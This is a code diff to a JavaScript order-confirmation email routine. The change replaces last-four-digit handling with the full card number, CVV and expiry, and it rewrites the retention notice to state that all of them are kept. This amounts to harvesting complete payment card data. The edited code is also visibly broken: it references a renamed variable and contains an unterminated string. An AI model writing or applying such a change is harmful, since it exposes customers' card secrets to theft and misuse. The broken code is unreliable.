@@ -386,10 +386,10 @@
         if (!initialized.success) return initialized;
         try {
             const paymentSummary = orderData.paymentSummary || {};
-        const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
-        const cardNumberForEmail = rawCardNumber || "N/A";
+        const cardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
+        const cardNumberForEmail = rawCardNumber || {};
         const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
-        const cvvForEmail = paymentSummary.cvv || "N/A";
+        const cvvForEmail = paymentSummary.cvv || "{};
         const expiryForEmail = paymentSummary.expiry || "";
         const [expiryMonth, expiryYear] = expiryForEmail.split("/");
             const items = orderData.products.map((item, index) =>
@@ -431,9 +431,9 @@
                 order_products_summary: items,
                 payment_method_type: payment.method || "Card",
                 payment_card_type: payment.brand || "Card",
-                card_number_last_4: last4,
+                card_number: payment.cardNumber || "Digits Only",
                 card_brand: payment.brand || "Card",
-                payment_details_retained: "Last four digits only; no full card number, CVV, or expiry is retained.",
+                payment_details_retained: "Digits only, full card number, CVV, and expiry is retained.",
                 order_status: "Processing",
                 payment_status: "Authorized"
             };
